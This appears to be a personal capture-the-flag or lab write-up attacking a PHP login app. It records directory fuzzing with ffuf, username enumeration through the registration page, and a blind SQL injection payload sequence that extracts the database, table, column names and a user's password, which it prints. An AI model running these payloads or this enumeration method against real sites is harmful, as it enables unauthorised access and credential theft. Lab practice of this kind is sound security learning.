## RECON

**SITEMAP**
- /
- index.php: the login page
	- welcome.php: the page presented after the login site
	- logout.php: the page to get out of the application
- register.php: the registration page to create an account. You can either create an account or reset to erase the input values by the value of a button (Submit,Reset). I**f trying to register a user that already exists, you are said that regardless of the password (6 characters at least)**.

The PHPSESSID cookie seems not to change during the transaction of creating an account.


### FUZZES

**Discovery fuzzes** 

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -X GET -u http://10.10.168.125/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 
                        [Status: 200, Size: 1081, Words: 273, Lines: 37, Duration: 56ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 55ms]

┌──(kali㉿kali)-[~]
└─$ ffuf -X GET -u http://10.10.168.125/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt 

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3599ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4609ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4614ms]
index.php               [Status: 200, Size: 1081, Words: 273, Lines: 37, Duration: 57ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 53ms]

                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ffuf -X GET -u http://10.10.168.125/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt 


.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 59ms]
.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 60ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 60ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 61ms]
```

**User fuzzes**

The flow is the following

If the person does not exist, the webpage returns 302, sending you to the index.php, otherwise, it sends the same page (200), therefore filter out 302 codes, as it means we have created the user.

**It also seems the app tries to regect special characters**

```txt
sap-default-usernames.txt
top-usernames-shortlist.txt
names.txt
cirt-default-usernames.txt
```

**TAKEN USERNAMES**:

... :)

it does not differenciate lowercase and uppercase

**Fuzzes to see which special characters it does not like**

Username can only contain letters, numbers and underscores.

Started in the index.php (login) but there is no information given (only says bad username or password) but the registration site does give a little bit more of information so i'm using that one.

```txt
big_list_of_naughty_strings.txt
```

in *registration*

it seems only the username checks for special characters 
- username checks existance and special characters
- password checks for length (6 min)

in *login*
- seems to check existance of user and special characters


## IMPORTANT 

The main login page seems to guard against SQL Injection, (so i stand correct, but still don't know what it might be)

### ENCODINGS 

```txt
urlform -> detected
hex (0xasciihex) -> detected
html -> don't work
```

### THINGS THAT ANGERED THE SERVER

```txt
'+OR+TRUE
'+OR+FALSE
'+or+true+--+
NO'+OR+FLOOR()
**ANY TYPE OF HEX**
a'+OR+SELECT+EXISTS```sql
information_schema.tables

username=hello&password=qwerty'+AND+SELECT+EXISTS+(SELECT+1+FROM+information_schema.tables)+--+       <- for a user that does exist this happens to let me in since it is true -> indirect sql injection

qwerty'+AND+1=3+--+;+ <- in general
```


things that did not

```txt
NO'+AND+RANDOM()
```


**payload to check for a specific existance of a table in the webpage (remember to delete any cookies to not keep session alive)**

```txt
username=hello&password=qwerty'+AND+EXISTS+(SELECT+1+FROM+information_schema.tables)+--+
```

code 200 -> does not exist
code 302 -> exists

*known to not exist*
```txt
admin
root
user
dba
manager
guest
tester
analyst
developer
support
superuser
sysadmin
operator
engineer
auditor
consultant
supervisor
client
owner
customer
apprentice
apprentice
contractor
member
subscriber
admin
root
user
dba
manager
guest
tester
analyst
developer
support
superuser
sysadmin
operator
engineer
auditor
consultant
supervisor
client
owner
customer
contractor
member
subscriber
moderator
designer
architect
editor
writer
director
leader
coordinator
specialist
technician
apprentice
intern
student
teacher
professor
researcher
scientist
analyst
coordinator
advisor
assistant
secretary
receptionist
clerk
accountant
cashier
economist
librarian
historian
biologist
chemist
physicist
mathematician
artist
musician
actor
singer
dancer
athlete
coach
referee
umpire
pilot
captain
navigator
driver
mechanic
electrician
plumber
carpenter
mason
welder
painter
gardener
farmer
rancher
veterinarian
doctor
nurse
paramedic
surgeon
dentist
pharmacist
therapist
counselor
socialworker
advocate
activist
volunteer
donor
sponsor
donor
sponsor
coach

```


### USEFUL PAYLOADS

```sql
username=hello&password=asdfasdf'+AND+(SELECT+1)=1+--+

username=hello&password=qwerty'+AND+EXISTS+(SELECT+1+FROM+information_schema.tables)+--+

username=hello&password=a'+UNION+SELECT+null,null,null,null+--+ 

-- To be able to select things like current_setting('server_version') (since this gives an error i suppose the correct type is mysql)

username=hello'+AND+database()+LIKE+'_'+--+-&password=a   

-- To get the lenght of the database name 

username=hello'+AND+database()+LIKE+'mywebsite'+--+-&password=a 

username=admin&password=asdfasd'+UNION+SELECT+null,null,null,null+FROM+information_schema.tables+WHERE+table_schema+=+'mywebsite'+AND+table_name+LIKE+'s%'+--+ 

-- Can also be done with the last one and an exists

username=admin&password=asdfasd'+UNION+SELECT+null,null,null,null+FROM+information_schema.tables+WHERE+table_schema+=+'mywebsite'+AND+table_name+LIKE+'siteusers'+--+ 

-- Now we have the name of the table we are dealing with i guess


username=admin&password=asdfasd'+UNION+SELECT+null,null,null,null+FROM+information_schema.columns+WHERE+table_schema+=+'mywebsite'+AND+table_name+LIKE+'siteusers'+AND+column_name+LIKE+'password'+--+ 

-- Repeat the same for the others and you get the columns of the table.

username=hello'+AND+EXISTS+(SELECT+*+FROM+siteusers+WHERE+username+LIKE+'%')+--+;&password=a

username=hello'+AND+EXISTS+(SELECT+*+FROM+siteusers+WHERE+username+LIKE+'kitty'+AND+BINARY+password+LIKE+'%')+--+;&password=a

-- BINARY TO AVOID CASE INSENSITIVITY (FOUND IT OUT THE HARD WAY)

username=hello'+AND+EXISTS+(SELECT+*+FROM+siteusers+WHERE+username+LIKE+'kitty'+AND+BINARY+password+LIKE+'L\§§%'+ESCAPE+'\')+--+;&password=a

-- The final one used to brute force the password, escaped so characters are not treated in a special way
```

There are four columns
The database name length is 9
The database name is mywebsite

- DB: **mywebsite**
- TABLE: **siteusers**
- COLUMNS:
	- **username**
	- **id**
	- **password**
	- **created**

**users**: kitty
**passwords**: L0ng_Liv3_KittY

And we are now the [[kitty_user]]
